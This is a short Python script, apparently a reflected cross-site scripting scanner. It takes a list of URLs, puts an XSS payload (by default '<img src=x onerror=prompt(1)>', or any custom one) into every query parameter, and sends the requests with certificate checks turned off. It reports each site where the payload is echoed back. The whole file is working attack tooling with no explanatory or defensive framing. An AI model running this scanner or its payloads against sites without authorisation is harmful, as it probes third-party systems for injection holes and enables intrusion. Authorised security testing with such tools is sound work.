import argparse
import requests

parser = argparse.ArgumentParser(description='Process some URLs.')
parser.add_argument('--file', type=str, required=True, help='input file containing urls')
parser.add_argument('--payload', type=str, default='<img src=x onerror=prompt(1)>', help='custom payload to use')

args = parser.parse_args()

with open(args.file, 'r') as file:
    urls = [line.strip() for line in file]

for url in urls:
    try:
        url_parts = url.split('?')
        if len(url_parts) > 1:
            params = url_parts[1].split('&')
            new_params = []
            for param in params:
                key_value = param.split('=')
                if len(key_value) > 1:
                    key, value = key_value
                    new_params.append(f'{key}={args.payload}')
                else:
                    new_params.append(f'{param}={args.payload}')
            url_with_payload = f'{url_parts[0]}?{"&".join(new_params)}'
        else:
            url_with_payload = f'{url}?key={args.payload}'

        response = requests.get(url_with_payload, verify=False)

        if args.payload in response.text:
            print(f'XSS vulnerability found in {url}')
    except Exception as e:
        print(f'Error occurred while processing {url}: {e}')